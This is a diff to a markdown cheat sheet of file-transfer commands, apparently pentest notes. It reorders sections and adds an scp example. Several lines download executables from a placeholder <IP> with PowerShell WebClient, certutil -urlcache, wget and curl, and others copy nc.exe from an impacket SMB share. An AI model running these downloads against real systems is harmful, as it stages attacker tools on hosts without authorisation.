@@ -1,25 +1,4 @@
 # File Transfers
-
-## HTTP
-```
-python -m SimpleHTTPServer 80
-```
-
--> Windows
-```
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\user\Desktop\file.exe')"
-iwr -uri http://<IP>/file -Outfile file
-wget http://<IP>/file -O file
-curl http://<IP>/file -o file
-certutil -urlcache -f http://<IP>:803/ok.exe ok.exe  
-```
-
--> Linux
-```
-wget http://<IP>/file
-curl http://<IP>/file > file
-```
-
 ## SMB Server
 -> Setting
 ```
@@ -29,6 +8,28 @@ impacket-smbserver share . -smb2support -user user -password teste321
 ```
 net use \\<smbserver>\share /USER:user teste321
 copy \\<smbserver>\share\nc.exe .
+```
+
+## HTTP
+-> start a web server
+```
+python -m SimpleHTTPServer 80
+service apache2 start
+```
+
+-> Windows - file download
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\user\Desktop\file.exe')"
+iwr -uri http://<IP>/file -Outfile file
+wget http://<IP>/file -O file
+curl http://<IP>/file -o file
+certutil -urlcache -f http://<IP>:803/ok.exe ok.exe  
+```
+
+-> Linux - file download
+```
+wget http://<IP>/file
+curl http://<IP>/file > file
 ```
 
 ## Pure-FTPd
@@ -71,4 +72,9 @@ sudo atftpd --daemon --port 69 /tftp
 -> Transfer
 ```
 tftp -i <IP> get file
+```
+
+## scp
+```
+scp file <user>@192.168.0.20:/home/user/
 ```
